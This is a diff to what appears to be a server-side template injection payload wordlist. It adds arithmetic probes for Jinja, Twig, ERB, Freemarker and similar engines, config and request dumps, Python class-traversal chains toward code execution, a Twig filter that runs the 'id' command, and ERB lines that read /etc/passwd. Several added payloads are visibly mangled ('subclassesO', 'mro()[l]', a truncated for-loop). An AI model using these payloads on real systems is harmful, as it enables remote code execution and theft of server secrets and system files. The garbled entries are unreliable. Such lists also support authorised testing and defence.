@@ -1,17 +1,29 @@
+${{<%[%'"}}%\.
+{% debug %}
 {7*7}
-{{7*7}}
-#{{7*7}}
 %{7*7}
 %{{7*7}}
-{{2*2}}[[3*3]]
-{{3*'3'}}
 <%= 3 * 3 %>
 ${6*6}
 ${{3*3}}
+${{7*7}}
+${= 3*3}
 @(6+5)
+@(3*3)
 #{3*3}
+#{7+7}
+#{{7*7}}
 #{ 3 * 3 }
+#{{7*7}}
+#{{ '7'*7 }}
+[=7*7]
+[[3*3]]
 *{7*7}
+{{= 7*7}}
+{{7*7}}
+{{ '7'*7 }}
+{{2*2}}[[3*3]]
+{{3*'3'}}
 {{dump(app)}}
 {{app.request.server.all|join(',')}}
 {{config.items()}}
@@ -23,6 +35,12 @@ ${{3*3}}
 {{'a'.toUpperCase()}} 
 {{ request }}
 {{self}}
+{{dump(app)}}
+{{ [] .class.base.subclassesO }}
+{{''.class.mro()[l] .subclassesO}}
+for c in [1,2,3] %}{{ c,c,c }}{% endfor %}
+{{ []._class.base.subclasses_O }}
+{{['id']|filter('system')}}
 <%= File.open('id').read %>
 <%= File.open('whoami').read %>
 <%= File.open('/etc/passwd').read %>
